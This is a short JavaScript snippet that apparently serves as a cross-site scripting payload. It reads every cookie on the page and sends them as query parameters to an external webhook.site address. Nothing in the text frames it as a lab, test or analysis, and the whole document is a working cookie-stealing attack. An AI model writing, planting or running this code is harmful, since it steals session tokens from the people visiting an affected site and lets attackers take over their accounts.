const cookies = document.cookie.split('; ');

const params = new URLSearchParams();
cookies.forEach(cookie => {
    const [key, value] = cookie.split('=');
    params.append(key, value);
});

fetch(`https://webhook.site/fcb52573-055a-42f3-b0fa-f4c7c4b88360?${params.toString()}`);
